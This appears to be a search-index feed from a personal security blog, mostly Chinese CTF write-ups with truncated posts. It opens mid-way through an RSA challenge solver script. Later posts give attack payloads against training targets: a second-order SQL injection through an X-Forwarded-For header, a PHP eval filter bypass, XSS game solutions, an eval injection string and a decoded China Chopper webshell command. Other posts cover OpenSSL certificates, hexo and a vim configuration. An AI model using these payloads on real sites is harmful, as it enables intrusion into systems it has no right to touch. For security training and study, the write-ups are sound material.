d, p*q)).encode(&#39;hex&#39;) r.recvuntil(&#34;encode(&#39;hex&#39;)=&#34;) r.sendline(m) d = 61931015986410954522379841763963945834108214123439860201390512063842165571430799255094107119082046571341221952786658415661511901536119262974324197242727901361853519060099176095718398341546521709753140715090423775413590463159715914497625346364363050316931779727154988269576808476796380941227956316802411370267 n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 c=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 m = long_to_bytes(pow(c, d, n)).encode(&#39;hex&#39;) r.recvuntil(&#34;encode(&#39;hex&#39;)=&#34;) r.sendline(m) m = 2519188594271759205757864486234199030368509477419996746572813835802776507456368520243429255706508061522045 m = long_to_bytes(m).encode(&#39;hex&#39;) r.recvuntil(&#34;encode(&#39;hex&#39;)=&#34;) r.sendline(m) m = &#34;464c41477b325e3872736133393863663864663763323636363162623763623635623262396661653235657d&#34; r.recvuntil(&#34;encode(&#39;hex&#39;)=&#34;) r.sendline(m) d = 776765455081795377117377680209510234887230129318575063382634593357724998207571 c=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL n = 0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L m = long_to_bytes(pow(c,d,n)).encode(&#39;hex&#39;) r.recvuntil(&#34;encode(&#39;hex&#39;)=&#34;) r.sendline(m) r.interactive()   ]]></content></entry><entry><title>RoarCTF 2019复现</title><url>/posts/ctf-roarctfwp/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  web online_proxy 特征: 第一次登录后源代码内容有如下:
换一个X-Forwarded-For 后会发现currentip是根据xff判别的
那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了
$result = query(&amp;#34;select current_ip, last_ip from ip_log where uuid = &amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;&amp;#34;); if(count($result) &amp;gt; 0) { if($ip !== $result[0][&amp;#39;current_ip&amp;#39;]) { $last_ip = $result[0][&amp;#39;current_ip&amp;#39;]; query(&amp;#34;delete from ip_log where uuid=&amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;&amp;#34;); } else { $last_ip = $result[0][&amp;#39;last_ip&amp;#39;]; } } query(&amp;#34;insert into ip_log values (&amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;, &amp;#39;&amp;#34;.addslashes($ip).&amp;#34;&amp;#39;, &amp;#39;$last_ip&amp;#39;);&amp;#34;); die(&amp;#34;\n&amp;lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &amp;#34;.($last_ip !== &amp;#34;&amp;#34; ? &amp;#34;\nLast Ip: &amp;#34;.$last_ip : &amp;#34;&amp;#34;).&amp;#34; --&amp;gt;&amp;#34;); 解法:
先用1&#39;|1|&#39;1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得 …  ]]></content></entry><entry><title>bytectf2019</title><url>/posts/ctf-bytectf2019/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  boring code source code
&amp;lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&amp;#39;/data:\/\//i&amp;#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&amp;#39;url&amp;#39;])){ $url = $_POST[&amp;#39;url&amp;#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&amp;#39;/baidu\.com$/&amp;#39;, $r[&amp;#39;host&amp;#39;])) { $code = file_get_contents($url); if (&amp;#39;;&amp;#39; === preg_replace(&amp;#39;/[a-z]+\((?R)?\)/&amp;#39;, NULL, $code)) { if (preg_match(&amp;#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&amp;#39;, $code)) { echo &amp;#39;bye~&amp;#39;; } else { eval($code); } } } else { echo &amp;#34;error: host not allowed&amp;#34;; } } else { echo &amp;#34;error: invalid url&amp;#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload
if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); …  ]]></content></entry><entry><title>php session反序列化</title><url>/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url><categories><category>安全研究</category></categories><tags/><content type="html"><![CDATA[  php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:
session反序列化漏洞 特征 phpinfo中默认的session.serialize_handler和本地的值不一样 ini_set(&amp;lsquo;session.serialize_handler&amp;rsquo;, &amp;lsquo;php&amp;rsquo;);之类的 phpinfo中session.upload_progress.enabled打开 一旦发现脚本中的序列化处理器和php.ini设置的不一样,就可能导致这个漏洞.
php 的 session 都是以文件的形式进行存储的, 常见的位置如下
/var/lib/php/sess_xxxxx /var/lib/php/sessions/sess_xxxxx /tmp/sess_xxxxx /tmp/sessions/sess_xxxxx php用于存取session时候的三种处理器
php:键名 ＋ 竖线 ＋ 序列化字符串 php_binary: 键名的长度对应的 ASCII 字符 ＋ 键名 ＋序列化字符串 php_serialize: 序列化字符串 在没有对session进行配置的情况下, 默认使用php序列化处理模式.
如果以php_serialize 方式存取但是又用php处理器去处理, 那么只要传入的字符串中有 | 就可以导致php处理器将 | 前的东东解释成键, 而将后面的东西解释称值, 而后面的东西一般就是要反序列化的字符串了.
php5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session, 所以这个洞要看版本
将payload传入session的方式有两种, 一种是对面开放本地可控的数据, 另一种是因为配置不当造成session可控
当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$SESSION中。
_当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时， 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session …  ]]></content></entry><entry><title>证书相关</title><url>/posts/tech-openssl/</url><categories><category>技术</category></categories><tags/><content type="html">   来看看互联网世界的基石
通信过程的简化模型 第一阶段: 服务器向CA发起证书签名请求 服务器组织生成一个私钥
openssl genrsa -out target.key 1024 从私钥文件中得到公钥, 这个公钥会被用于给CA签名
openssl rsa -in target.key -pubout -out target_pub.key 使用私钥生成一个证书签名请求, 在生成过程中需要填写证书申请人的一些信息
openssl req -new -key target.key -out target.csr 生成完成后, 可以运行下面命令看看这个证书签名请求文件里都有什么
openssl req -text -in target.csr -verify 例如:
可以看到公钥也在里面.
接下来把证书签名请求文件提交给CA, CA审核通过后对该文件进行签名
openssl x509 -in target.csr -out target.crt -req -signkey ca.key -days 365 target.crt就是签名成功后的证书. 对于常见的自签名场景来说, ca.key就是target.key, 用自己的密钥去签名自己的证书请求, 自签名请求命令就是
openssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 然后CA将target.crt以及由Root CA签名的CA证书一同返回给申请人. 如下图所示:
Root CA的证书就那么几个, 内置在操作系统里, 受到所有程序的信任, 因此申请人得到由Root CA签名的CA证书后, 就可以信任该CA组织, 进而可以信任该CA组织签发给自己的证书. 对于其他的客户端而言也是这样.
第二阶段 客户访问服务端 客户端发起请求, 服务端会把自己的证书和签自己证书的CA机构的证书一起发过去
如图, 由于Root CA是可信任的, 因此该CA机构是可信任的, 因此该CA机构签发的服务端证书也是可信任的, 这叫 信任链.
信任建立之后, 客户端生成一个对称密钥, 用服务端证书里的公钥加密之后发送给服务端, 最后双方都用这个对称密钥来加密数据进行信息交换 (实际上, 对称密钥的生成是服务端和客户端通过彼此协商过程中的各种 …  </content></entry><entry><title>Google_Game</title><url>/posts/ctf-google-game/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  Google Xss game Level 3 This website provides some API (after the arch pointer).
solution:
https://xss-game.appspot.com/level3/frame#&lt;img src='foo' onerror=alert();&gt;
level 4 &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt; &lt;script src=&#34;/static/game-frame.js&#34;&gt;&lt;/script&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/game-frame-styles.css&#34; /&gt; &lt;script&gt; function startTimer(seconds) { seconds = parseInt(seconds) || 3; setTimeout(function() { window.confirm(&#34;Time is up!&#34;); window.history.back(); }, seconds * 1000); } &lt;/script&gt; &lt;/head&gt; &lt;body id=&#34;level4&#34;&gt; &lt;img src=&#34;/static/logos/level4.png&#34; /&gt; &lt;br&gt; &lt;img src=&#34;/static/loading.gif&#34; onload=&#34;startTimer(&#39;{{ timer }}&#39;);&#34; /&gt; &lt;br&gt; &lt;div id=&#34;message&#34;&gt;Your timer will execute in {{ timer }} seconds.&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; solution:
https://xss-game.appspot.com/level4/frame?timer=&#39;);alert(&#39; level 5 &lt;!--signup.html--&gt; &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt; &lt;script src=&#34;/static/game-frame.js&#34;&gt;&lt;/script&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/game-frame-styles.css&#34; /&gt; &lt;/head&gt; &lt;body id=&#34;level5&#34;&gt; &lt;img src=&#34;/static/logos/level5.png&#34; /&gt;&lt;br&gt;&lt;br&gt; &lt;!-- We&#39;re ignoring the email, but the poor user will never know! --&gt; Enter email: &lt;input id=&#34;reader-email&#34; name=&#34;email&#34; value=&#34;&#34;&gt; &lt;br&gt;&lt;br&gt; &lt;a href=&#34;{{ next }}&#34;&gt;Next &gt;&gt;&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; solution:
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&#39;xss&#39;) and click the Next button.
level 6 This website allow user to execute alternative js script
solution:
https://xss-game.appspot.com/level6/frame#data:text/plain,alert(&#39;xss&#39;)   ]]></content></entry><entry><title>2019 DDCTF web</title><url>/posts/ctf-2019-ddctf-web/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。
web 签到题 点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。
然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：
&amp;lt;?php Class Application { var $path = &amp;#39;&amp;#39;; public function response($data, $errMsg = &amp;#39;success&amp;#39;) { $ret = [&amp;#39;errMsg&amp;#39; =&amp;gt; $errMsg, &amp;#39;data&amp;#39; =&amp;gt; $data]; $ret = json_encode($ret); header(&amp;#39;Content-type: application/json&amp;#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &amp;#39;admin&amp;#39;; if(!empty($_SERVER[&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;]) &amp;amp;&amp;amp; $_SERVER[&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;] == $DIDICTF_ADMIN) { $this-&amp;gt;response(&amp;#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&amp;#39;); return TRUE; }else{ $this-&amp;gt;response(&amp;#39;抱歉，您没有登陆权限，请获取权限后访问-----&amp;#39;,&amp;#39;error&amp;#39;); exit(); } } private function sanitizepath($path) { $path = trim($path);//去掉空格 $path=str_replace(&amp;#39;../&amp;#39;,&amp;#39;&amp;#39;,$path);// …  ]]></content></entry><entry><title>流量分析</title><url>/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[   bugku 中的部分misc题目
中国菜刀 下载流量包之后追踪tcp流量或者http流量可以在目录中看见flag.tar.gz字段
思路1：binwalk
先把数据包文件拖进kali子系统中
chmod 777 caidao/ cd caidao/ chmod 777 caidao.pcapng binwalk -e caidao.pcapng cd _caidao.pcapng.extracted/ cat 1E43 思路2：wireshark数据包追踪，把一串base64拎出来
@ini_set(&amp;#34;display_errors&amp;#34;,&amp;#34;0&amp;#34;); @set_time_limit(0); if(PHP_VERSION&amp;lt;&amp;#39;5.3.0&amp;#39;) {@set_magic_quotes_runtime(0);}; echo(&amp;#34;X@Y&amp;#34;); $D=&amp;#39;C:\\wwwroot\\&amp;#39;; $F=@opendir($D); if($F==NULL){echo(&amp;#34;ERROR:// Path Not Found Or No Permission!&amp;#34;);} else{$M=NULL;$L=NULL; while($N=@readdir($F)){$P=$D.&amp;#39;/&amp;#39;.$N;$T=@date(&amp;#34;Y-m-d H:i:s&amp;#34;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&amp;#34;\t&amp;#34;.$T.&amp;#34;\t&amp;#34;.@filesize($P).&amp;#34;\t&amp;#34;.$E.&amp;#34;\n&amp;#34;;if(@is_dir($P))$M.=$N.&amp;#34;/&amp;#34;.$R;else $L.=$N.$R;} echo $M.$L;@closedir($F);};echo(&amp;#34;X@Y&amp;#34;);die(); 当然这没啥用。。
数据包的数据都是在line-based text data里面的
点击line-based text data,右击，点击显示show packet bytes 额。。。把像\301\213\341这样的编码处理一下，之所以start设置为3，是因为前 …  ]]></content></entry><entry><title>密码学题目</title><url>/posts/ctf-crypto/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[   记录密码学刷过的题目
De1ctf2019 xorzz 源码
from itertools import * # from data import flag,plain plain = &amp;#34;dd&amp;#34; flag = &amp;#34;de1ctf{testflag}&amp;#34; key=flag.strip(&amp;#34;de1ctf{&amp;#34;).strip(&amp;#34;}&amp;#34;) assert(len(key)&amp;lt;38) salt=&amp;#34;WeAreDe1taTeam&amp;#34; ki=cycle(key) si=cycle(salt) cipher = &amp;#39;&amp;#39;.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si))) for p in plain]) print cipher # output: # …  ]]></content></entry><entry><title>bugku writeup</title><url>/posts/ctf-bugku-writeup/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[   纪念那段岁月
web3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl+u查看源代码，发现一串
&amp;lt;!--&amp;amp;#75;&amp;amp;#69;&amp;amp;#89;&amp;amp;#123;&amp;amp;#74;&amp;amp;#50;&amp;amp;#115; &amp;amp;#97;&amp;amp;#52;&amp;amp;#50;&amp;amp;#97;&amp;amp;#104;&amp;amp;#74;&amp;amp;#75;&amp;amp;#45; &amp;amp;#72;&amp;amp;#83;&amp;amp;#49;&amp;amp;#49;&amp;amp;#73;&amp;amp;#73;&amp;amp;#73;&amp;amp;#125;--&amp;gt; 这是unicode，转码即可
你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包
本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。
payload：/index.php?hello = show_source(&amp;lsquo;flag.php&amp;rsquo;) 网上的payload：/index.php?hello=1);show_source(&amp;lsquo;flag.php&amp;rsquo;);var_dump(
域名解析 编辑etc/hosts添加一条123.206.87.240	flag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。
反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。
添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）
你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag
变量1 函数知识： isset（） …  ]]></content></entry><entry><title>使用hexo和github搭建网站</title><url>/posts/tech-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url><categories><category>技术</category></categories><tags/><content type="html"><![CDATA[  基础修改 修改 _config.yml，写上网站的标题
title: subtitle: description: 选择主题
theme: next hexo 插件 字数统计和阅读时长统计 https://github.com/theme-next/hexo-symbols-count-time 在 _config.yml 中添加
symbols_count_time: symbols: true time: true total_symbols: true total_time: true exclude_codeblock: false awl: 4 wpm: 275 suffix: &amp;#34;mins.&amp;#34; 在Next主题中的 _config.yml中添加
symbols_count_time: separated_meta: true item_text_post: true item_text_total: true git 部署 在你的github账户上创建仓库yourusername.github.io，必须是用户名开头命名，否则github page不会生效。
首先生成个人公私钥
cd ssh-keygen -t rsa -C &amp;#34;your_email@example.com&amp;#34; 然后将公钥粘贴进github账户的个人设置里面 ssh -T git@github.com git config --global user.name &amp;#34;username&amp;#34; git config --global user.email &amp;#34;email&amp;#34; 在博客目录下下载：
npm install hexo-deployer-git --save 修改网站根目录下的_config.yml文件
deploy: - type: git#注意git的前面要加空格否则不生效 repo: https://github.com/example/example.github.io.git branch: master 保存退出后执行命令：
git config --global user.email &amp;#34;you@example.com&amp;#34; git config --global user.name &amp;#34;Your …  ]]></content></entry><entry><title>ch3n9w 的 vim</title><url>/posts/tech-ch4ser-vim/</url><categories><category>技术</category></categories><tags/><content type="html"><![CDATA[  ch3n9w 的 vim 本篇文章中的插件均已过时, 不推荐使用
《程序员修炼之道》中有一句话:最好是精通一种编辑器，并将其用于所有编辑任务。如果不坚持使用一种编辑器，可能会面临现代的巴别特大混乱。 ，实质今日，深以为然。而自从接触vim之后我一直都保持着有空折腾折腾的好习惯，它的简洁和高度自由让人着迷，围绕着vim衍生出的插件数不胜数。奈何插件繁多的同时也意味着选择的困难和配置的繁琐。为了准备以后可能出现的突发情况比如配置丢失或者重新安装，特在此以实现特定功能为主题，记录自己配置vim的过程。
相比较vim, neovim的速度更快.
为了调动食欲,先上效果图:
vim下打开终端
以下内容是配置 安装（vim-plug） curl -fLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs \ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim ~/.config/nvim/init.vim &amp;#34; c to caplock , add XKBOPTIONS=&amp;#34;caps:escape&amp;#34; in /etc/default/keyboard &amp;#34; 让进入vim的时候显示绝对行号,当进入编辑模式的时候也显示绝对行号,但是从编辑模式回到普通模式的时候切换到相对行号 set number augroup relative_numbser autocmd! autocmd InsertEnter * :set norelativenumber autocmd InsertLeave * :set relativenumber augroup END set wildmenu &amp;#34; 忽略大小写 set ignorecase set shell=/bin/zsh &amp;#34; font and icons for vim set encoding=utf8 &amp;#34; set guifont=DroidSansMono\ Nerd\ Font\ 11 autocmd User Startified setlocal buflisted &amp;#34; leader键映射 let …  ]]></content></entry><entry><title>Search</title><url>/search/</url><categories/><tags/><content type="html">    </content></entry></search>